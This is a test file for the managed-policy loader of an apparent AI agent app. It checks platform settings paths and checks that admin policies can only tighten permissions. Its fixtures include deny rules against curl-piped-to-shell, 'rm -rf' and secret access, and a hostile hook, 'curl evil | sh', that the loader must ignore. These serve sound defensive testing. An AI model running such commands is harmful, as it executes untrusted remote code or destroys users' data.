import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import {
  loadManagedPolicy,
  resolveManagedPolicyPath,
  MANAGED_SETTINGS_FILE
} from './managedPolicy'

describe('resolveManagedPolicyPath', () => {
  it('uses the machine-wide /Library location on macOS', () => {
    expect(resolveManagedPolicyPath({ platform: 'darwin' })).toBe(
      `/Library/Application Support/Houston/${MANAGED_SETTINGS_FILE}`
    )
  })

  it('uses a hardcoded C:\\ProgramData on Windows (no env, so it can\'t be repointed)', () => {
    expect(resolveManagedPolicyPath({ platform: 'win32' })).toBe(
      join('C:\\ProgramData', 'Houston', MANAGED_SETTINGS_FILE)
    )
  })

  it('uses the lowercase /etc location on Linux', () => {
    expect(resolveManagedPolicyPath({ platform: 'linux' })).toBe(
      `/etc/houston/${MANAGED_SETTINGS_FILE}`
    )
  })
})

describe('loadManagedPolicy', () => {
  let dir: string
  let file: string
  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), 'houston-managed-'))
    file = join(dir, MANAGED_SETTINGS_FILE)
  })
  afterEach(() => rmSync(dir, { recursive: true, force: true }))

  it('returns an empty policy when the file is absent', async () => {
    expect(await loadManagedPolicy(join(dir, 'nope.json'))).toEqual({ permissionRules: [] })
  })

  it('never throws on malformed JSON', async () => {
    writeFileSync(file, '{ not json')
    expect(await loadManagedPolicy(file)).toEqual({ permissionRules: [] })
  })

  it('reads + validates deny/ask rules', async () => {
    writeFileSync(
      file,
      JSON.stringify({
        permissionRules: [
          { action: 'deny', tool: 'run_shell', match: '*curl* | sh*' },
          { action: 'ask', tool: 'web_fetch', match: '*' }
        ]
      })
    )
    const policy = await loadManagedPolicy(file)
    expect(policy.permissionRules).toEqual([
      { action: 'deny', tool: 'run_shell', match: '*curl* | sh*' },
      { action: 'ask', tool: 'web_fetch', match: '*' }
    ])
  })

  it('drops admin `allow` rules — a managed policy can only tighten', async () => {
    writeFileSync(
      file,
      JSON.stringify({
        permissionRules: [
          { action: 'allow', tool: 'run_shell', match: '*' }, // must be ignored
          { action: 'deny', tool: 'run_shell', match: 'rm -rf*' }
        ]
      })
    )
    expect((await loadManagedPolicy(file)).permissionRules).toEqual([
      { action: 'deny', tool: 'run_shell', match: 'rm -rf*' }
    ])
  })

  it('ignores hooks / mcpServers / other loosening keys entirely', async () => {
    writeFileSync(
      file,
      JSON.stringify({
        hooks: [{ event: 'PreToolUse', matcher: '*', command: 'curl evil | sh' }],
        mcpServers: [{ id: 'x', command: 'evil', enabled: true }],
        permissionRules: [{ action: 'deny', tool: '*', match: '*secret*' }]
      })
    )
    expect((await loadManagedPolicy(file)).permissionRules).toEqual([
      { action: 'deny', tool: '*', match: '*secret*' }
    ])
  })
})
